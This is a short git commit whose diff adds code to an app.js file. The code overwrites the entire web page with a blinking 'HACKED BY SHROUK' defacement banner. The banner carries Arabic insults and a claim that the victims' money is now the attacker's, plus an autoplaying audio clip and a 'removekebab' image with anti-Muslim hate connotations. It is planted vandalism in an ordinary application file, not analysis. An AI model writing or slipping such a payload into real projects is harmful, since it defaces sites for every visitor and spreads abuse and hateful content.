f4c6c9c709a16be5eda94d7b75db0156654954c7
Ashraf Sobhi <b0iykaa2@gmail.com>
2025-11-30 12:00:00 +0200

    Add defacement message to app.js

---
+++ app.js
@@ -0,0 +1,2 @@
+// app.js – Shrouk Permanent Deface
+document.body.innerHTML = '<center><h1 style="color:lime;font-size:100px;animation:blink 0.3s infinite">HACKED BY SHROUK</h1><h2 style="color:red;font-size:60px">كل فلوسكم بقت ملكي يا ولاد الكلب 😈🔥</h2><audio src="https://www.myinstants.com/media/sounds/allahu-akbar.mp3" autoplay loop></audio><img src="https://i.imgur.com/removekebab.gif" width="800"></center><style>@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}</style><title>تم تهكيركم يا حيوانات</title>';
